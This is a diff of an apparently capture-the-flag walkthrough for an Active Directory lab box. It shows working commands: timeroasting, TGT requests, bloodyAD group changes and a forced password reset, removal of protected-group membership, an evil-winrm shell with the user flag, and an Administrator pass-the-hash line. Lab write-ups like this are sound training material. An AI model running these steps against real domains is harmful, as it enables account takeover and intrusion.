@@ -320,7 +320,9 @@ But the `mm.turner` user comes up in some shortest path searches, keep this in m
 
 ![](https://github.com/user-attachments/assets/992d3a1d-bf6b-47ad-a265-588cfdeb700c)
 
-## 3. Timeroasting
+## 3. Getting access
+
+### 3.1. Timeroasting
 
 A technique called [timeroasting](https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac0) may work here
 
@@ -390,37 +392,6 @@ Folders: 56
 Files: 3100
 Size:       389386374
 Compressed: 19682772
-
-root@kali:~# cd hashcat-7.1.2/
-
-root@kali:~/hashcat-7.1.2# ll
-total 4520
-drwxr-xr-x 2 root root    4096 Aug 23 16:51 bridges
-drwxr-xr-x 6 root root    4096 Aug 23 16:51 charsets
-drwxr-xr-x 3 root root    4096 Aug 23 16:51 docs
--rw-r--r-- 1 root root      72 Aug 23 16:51 example0.cmd
--rw-r--r-- 1 root root  214302 Aug 23 16:51 example0.hash
--rwxr-xr-x 1 root root      66 Aug 23 16:51 example0.sh
--rw-r--r-- 1 root root      63 Aug 23 16:51 example400.cmd
--rw-r--r-- 1 root root      35 Aug 23 16:51 example400.hash
--rwxr-xr-x 1 root root      56 Aug 23 16:51 example400.sh
--rw-r--r-- 1 root root      56 Aug 23 16:51 example500.cmd
--rw-r--r-- 1 root root      35 Aug 23 16:51 example500.hash
--rwxr-xr-x 1 root root      50 Aug 23 16:51 example500.sh
--rw-r--r-- 1 root root 1069601 Aug 23 16:51 example.dict
-drwxr-xr-x 3 root root    4096 Aug 23 16:51 extra
--rwxr-xr-x 1 root root 1362152 Aug 23 16:51 hashcat.bin
--rw-r--r-- 1 root root 1537536 Aug 23 16:51 hashcat.exe
--rw-r--r-- 1 root root  240526 Aug 23 16:51 hashcat.hcstat2
-drwxr-xr-x 2 root root    4096 Aug 23 16:51 layouts
-drwxr-xr-x 2 root root    4096 Aug 23 16:51 masks
-drwxr-xr-x 2 root root   45056 Aug 23 16:51 modules
-drwxr-xr-x 2 root root   69632 Aug 23 16:51 OpenCL
-drwxr-xr-x 2 root root    4096 Aug 23 16:51 Python
-drwxr-xr-x 3 root root    4096 Aug 23 16:51 rules
-drwxr-xr-x 3 root root    4096 Aug 23 16:51 Rust
-drwxr-xr-x 2 root root    4096 Aug 23 16:51 tools
-drwxr-xr-x 2 root root    4096 Aug 23 16:51 tunings
 ```
 
 Put the hashes from `timeroast.py` without the `<rid>:` prefix and run hashcat against the hashes with rockyou.txt
@@ -441,15 +412,100 @@ Search for RID `1125` in BloodHound:
 
 ![](https://github.com/user-attachments/assets/82ffc2d9-d1d1-4c67-af5f-b2ce6e9623a8)
 
-And the related computer `IT-COMPUTER3` has `AddSelf` permission to `HELPDESK`:
+The computer account `IT-COMPUTER3` has `AddSelf` permission to `HELPDESK`:
 
-![](https://github.com/user-attachments/assets/005b6889-3424-4a29-b3b7-a4b0760e21c0)
+![](https://github.com/user-attachments/assets/50e6e082-f72e-45ca-bf8f-8db7f18f7bc7)
 
 ![](https://github.com/user-attachments/assets/26a6e5e8-b3bd-4dcf-be6f-f9478a2e158a)
 
-## work-in-progress
+`HELPDESK` has outbound control to several objects:
 
-Create `/etc/krb5.conf` to point to `dc.rustykey.htb` as KDC
+![](https://github.com/user-attachments/assets/22612c40-bece-4446-9b45-f6e0a9fd0ab2)
+
+ForceChangePassword:
+
+![](https://github.com/user-attachments/assets/7ebe2ec6-9d0f-4745-9f8f-03218f959e83)
+
+GenericWrite:
+
+![](https://github.com/user-attachments/assets/475f647e-3604-430f-8f3d-d9a6d350f759)
+
+AddMember:
+
+![](https://github.com/user-attachments/assets/753c1e34-3c8f-476c-8457-46a77eb60e41)
+
+### 3.2. Get TGT for `IT-COMPUTER3`
+
+```console
+root@kali:~# impacket-getTGT rustykey.htb/IT-COMPUTER3:'Rusty88!' -dc-ip dc.rustykey.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in IT-COMPUTER3.ccache
+
+root@kali:~# export KRB5CCNAME=IT-COMPUTER3\$.ccache
+```
+
+### 3.3. Add `IT-COMPUTER3` to `HELPDESK` group
+
+> [!Tip]
+>
+> bloodyAD is used to perform specific LDAP calls to a domain controller for AD privesc
+> 
+> It supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc
+>
+> Install bloodyAD in Kali with `apt -y install bloodyad`
+
+```console
+root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'
+[+] IT-COMPUTER3$ added to HELPDESK
+```
+
+### 3.4. Getting access to `bb.morgan`
+
+Using `ForceChangePassword` permission to reset password for `bb.morgan`:
+
+```console
+root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan Pass1234
+[+] Password changed successfully!
+```
+
+Getting TGT as `bb.morgan` fails:
+
+```console
+root@kali:~# impacket-getTGT rustykey.htb/bb.morgan:Pass1234 -dc-ip dc.rustykey.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
+```
+
+That's because `bb.morgan` is a member of `IT` group, which is a member of `PROTECTED OBJECTS` group:
+
+![](https://github.com/user-attachments/assets/c1a7443e-8fe0-48c7-8993-3c3d2f6df0fa)
+
+Let's remove both `SUPPORT` and `IT` groups from `PROTECTED OBJECTS` group:
+
+```console
+root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' IT
+[-] IT removed from PROTECTED OBJECTS
+
+root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' SUPPORT
+[-] SUPPORT removed from PROTECTED OBJECTS
+```
+
+Getting TGT for `bb.morgan` works:
+
+```console
+root@kali:~# impacket-getTGT rustykey.htb/bb.morgan:Pass1234 -dc-ip dc.rustykey.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in bb.morgan.ccache
+
+root@kali:~# export KRB5CCNAME=bb.morgan.ccache
+```
+
+Kerberos config file is required to use `evil-winrm` to connect to target using TGT
+
+Create `/etc/krb5.conf` to point to `dc.rustykey.htb` as KDC:
 
 ```console
 cat << EOF > /etc/krb5.conf
@@ -468,6 +524,26 @@ cat << EOF > /etc/krb5.conf
     rustykey.htb = RUSTYKEY.HTB
 EOF
 ```
+
+Connect to target as `bb.morgan` and get user flag:
+
+```console
+root@kali:~# evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: User is not needed for Kerberos auth. Ticket will be used
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> type ..\Desktop\user.txt
+c089bcf4eb71d15e482fc826d35ff99a
+```
+
+## work-in-progress
 
 ```
 impacket-getTGT rustykey.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:f7a351e12f70cc177a1d5bd11b28ac26
